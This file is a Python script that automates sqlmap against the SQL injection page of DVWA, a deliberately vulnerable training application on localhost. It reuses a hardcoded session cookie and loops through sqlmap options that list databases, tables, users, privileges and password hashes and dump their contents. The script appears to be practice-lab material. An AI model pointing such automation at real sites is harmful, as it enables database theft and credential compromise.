import subprocess
import requests

# Configuration
base_url = "http://127.0.0.1:42001/"
vuln_url = base_url + "vulnerabilities/sqli/"
params = {
    'id': '1',
    'Submit': 'Submit',
}
headers = {
    'Cookie': 'PHPSESSID=rkg47evun26n2jg6vjhrg3vlk8; security=low',
}

# Obtain the user token
def get_user_token():
    response = requests.get(vuln_url, headers=headers)
    print("Raw response text:", response.text)  # Debugging: print the raw response text
    if response.status_code == 200:
        user_token_start = response.text.find("user_token") + 22
        user_token_end = response.text.find('"', user_token_start)
        return response.text[user_token_start:user_token_end]
    else:
        print(f"Failed to access DVWA: {response.status_code}")
        return None

def run_sqlmap(url, cookie, options):
    command = ['python3', 'sqlmap-dev/sqlmap.py', '-u', url, '--cookie', cookie, '--batch'] + options

    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(result.stdout.decode('utf-8'))
    except Exception as e:
        print(f"An error occurred: {e}")

def main():
    user_token = get_user_token()
    if not user_token:
        print("Failed to retrieve user token.")
        return

    url = f"{vuln_url}?id=1&Submit=Submit&user_token={user_token}"
    cookie = headers['Cookie']

    sqlmap_options = [
        ['--dbs'],
        ['--tables'],
        ['--columns'],
        ['--dump'],
        ['--banner'],
        ['--current-user'],
        ['--current-db'],
        ['--is-dba'],
        ['--users'],
        ['--passwords'],
        ['--privileges'],
        ['--roles'],
        ['--fingerprint'],
        ['--all'],
    ]

    for options in sqlmap_options:
        print(f"Running SQLMap with options: {' '.join(options)}")
        run_sqlmap(url, cookie, options)

if __name__ == "__main__":
    main()
